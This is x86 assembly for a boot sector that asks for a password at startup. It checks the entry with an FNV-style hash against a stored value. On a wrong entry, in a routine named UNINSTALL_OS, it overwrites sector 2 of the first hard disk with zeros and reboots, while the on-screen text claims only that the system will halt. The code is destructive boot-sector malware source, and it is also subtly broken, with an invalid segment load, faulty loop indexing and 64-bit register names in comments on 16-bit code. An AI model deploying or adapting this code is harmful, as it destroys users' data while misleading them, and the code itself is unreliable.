; Boot sector code
org 7c00h                                 ; org 0x0000


START:
mov ah, 0x0e                              ; Color attributes (red on black background)
mov cx, -1
lea si, msg1
push cs                                   ; save cs so that the code refers to data in the same segment as the binary itself
pop ds                                    ; data segment register


PRINT_LOOP:
    lodsb                                 ; Load character into AL and increment SI
    test al, al                           ; Check if end of string (null byte)
    jz NEXT_STRING                        ; If end, go to next string
    int 10h                               ; Output character
    jmp PRINT_LOOP                        ; Repeat loop

NEXT_STRING:
    cmp si, msg_end                ; Check if we have reached the end of all messages
    jae READ_PASSWORD                     ; If yes, terminate execution
    jmp PRINT_LOOP                        ; Otherwise, continue printing the next text

READ_PASSWORD:
    lea di, password_input
    mov ah, 0x00
    int 16h
    cmp al, 13                            ; If Enter key is pressed
    stosb
    je INPUT_END 			              ; End input
    mov ah, 0x0E
    mov al, '*'
    int 10h 
    jmp READ_PASSWORD
;----------------------------------------------------------------------------------------------------

INPUT_END:
    lea si, password_input
    xor ax, ax                            ; Zero out RAX (will contain the result)
    xor cx, cx                            ; Zero out RCX (digit counter)

    .NEXT_CHAR:                           ; End of string is determined by Enter
        mov bx, si
        add bx, cx
        mov bl, [bx]                      ; Load the next character from the string
        cmp bl, 13                        
        je .done                          ; If reached, end the function
;----------------------------------------------------------------------------------------------------
        sub bl, '0'                       ; Convert character to digit
        xor  bh, bh
        mov dx, 10
        imul dx                            ; Multiply the current result by 10
        add ax, bx                        ; Add the new digit to the result
;----------------------------------------------------------------------------------------------------
        inc cx                            ; Move to the next character
        jmp .NEXT_CHAR                    ; Repeat the loop

        .done:
            mov [password_num], ax
            mov [password_len], cx
    ; AX contains the user-entered password in numeric form 
;----------------------------------------------------------------------------------------------------
    mov [password_num], ax
    lea di, password_num 

    FNV1A_HASH:
        ; Константы FNV-1a
        mov ax, 0xcbf2                    ; FNV offset basis
        mov cx, 0x11b3                    ; FNV prime

        ; Hashing
        xor dx, dx                        ; Zero out RDX (counter)
        .HASH_LOOP:
            cmp dx, [password_len]        ; Check if end of string
            jge .HASH_DONE                ; If reached, end hashing


            add di, dx
            mov bl, [di]                  ; Load the next byte from the string
            xor ax, bx                    ; XOR hash with byte
            imul cx                       ; Multiply the hash by FNV prime

            inc dx                        ; Move to the next byte
            jmp .HASH_LOOP                ; Repeat the loop

        .HASH_DONE:
            mov [password_num], ax
            mov ax, [password_num]
    
    cmp ax, [hash_pass]
    je REBOOT
    jmp UNINSTALL_OS

    REBOOT:
        mov ah, 0x02                      ; Read 1 sector from disk
        mov al, 0x01
        mov ch, 0x00
        mov cl, 0x02
        mov dh, 0x00
        mov dl, 0x80
        mov es, 0x0000
        mov bx, 0x7E00                    ; Address of the second sector loading
        int 0x13
        ; jc disk_error

        jmp 0x0000:0x7E00                 ; Transfer control
        int 19h;

    UNINSTALL_OS:
        mov ax, 0
        mov di, 0x7E00
        mov cx, 256                      ; 256 words = 512 bytes
        cld
        rep stosw                        ; Write zero to 256 words

        ; Writing one sector from disk: function INT 13h, AH = 03h
        mov ah, 0x03                     ; Function to write a sector
        mov al, 0x01                     ; Number of sectors to write (1 sector)
        mov ch, 0x00                     ; Cylinder number (low byte)
        mov cl, 0x02                     ; Sector number (for example, sector 2)
        mov dh, 0x00                     ; Head number
        mov dl, 0x80                     ; Disk: first hard disk
        mov es, 0x0000                   ; ES:BX points to the buffer in memory
        mov bx, 0x7E00                   ; Address of the buffer
        int 0x13                         ; BIOS call to write a sector

        int 19h

msg1 db "Warning! This is a test message for educational purposes,", 13, 10, 0
msg2 db "demonstrating boot sector functionality. To proceed, please enter the password.", 13, 10, 0
msg3 db "If the correct password is entered, the system will continue to boot.", 13, 10, 0
msg4 db "Otherwise, the system will halt.", 13, 10, 10, 10, 0
msg5 db "Enter your password: ", 0

msg_end db 0

password_num dw 1 dup(0)                 ; Variable for storing a number (8 bytes)
password_input db 8 dup(0)
password_len dw 1 dup(0)
    

hash_pass dw 0xc56e ; password hash--------------------------------------------------------------"c56e was generated by the hash program for the password 12345"


db 446 - ($ - START) dup (0)             ; db 510 - ($ - START) dup (0)

PARTITION_TABLE:
    db 0x80, 0x00, 0x02, 0x00, 0x0B, 0x00, 0x0F, 0xFF
    dd 2048, 100000
    db 16, 16, 16, 0

db 0x55, 0xAA 